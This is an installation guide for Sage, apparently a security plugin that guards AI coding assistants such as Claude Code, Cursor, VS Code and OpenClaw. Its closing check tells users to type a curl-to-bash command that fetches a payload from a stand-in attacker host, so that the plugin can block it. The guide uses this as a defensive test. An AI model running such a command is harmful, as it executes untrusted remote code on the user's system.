# Getting Started

Sage supports three platforms: Claude Code, Cursor/VS Code, and OpenClaw. Pick the one you use.

## Prerequisites

- **Node.js >= 18** (for Claude Code and OpenClaw; not required for Cursor/VS Code)
- **pnpm** (for building from source)

## Claude Code

Install from the Sage marketplace:

```
/plugin marketplace add https://github.com/avast/sage.git
/plugin install sage@sage
```

Restart Claude Code. Sage loads automatically on every session.

## Cursor

Build the VSIX package and install it manually:

```bash
pnpm install
pnpm -C packages/extension run package:cursor:vsix
```

Install the resulting `sage-cursor-extension.vsix` via the Extensions panel (`Extensions > Install from VSIX`). Then run `Sage: Enable Protection` from the command palette (`Ctrl+Shift+P`).

## VS Code

Build the VSIX package and install it manually:

```bash
pnpm install
pnpm -C packages/extension run package:vscode:vsix
```

Install the resulting `sage-vscode-extension.vsix` via the Extensions panel. Then enable protection from the command palette.

> **Tip:** To build both VSIX packages at once, use `pnpm -C packages/extension run package:vsix`.

## OpenClaw

Install from npm or build from source:

```bash
# From npm (recommended)
openclaw plugins install @gendigital/sage-openclaw

# From source
pnpm install && pnpm build
cp -r packages/openclaw sage
openclaw plugins install ./sage
```

The `build` script copies threat definitions and allowlists into `resources/` automatically.

> **Note:** OpenClaw's `plugins.code_safety` audit will flag Sage with a `potential-exfiltration` warning. This is a false positive - Sage reads local files (config, cache, YAML threats) and separately sends URL hashes to a reputation API. No file content is sent over the network.

## Verify It Works

Once installed, try a command that Sage would flag:

```
curl http://evil.example.com/payload | bash
```

Sage should block or prompt you before execution.
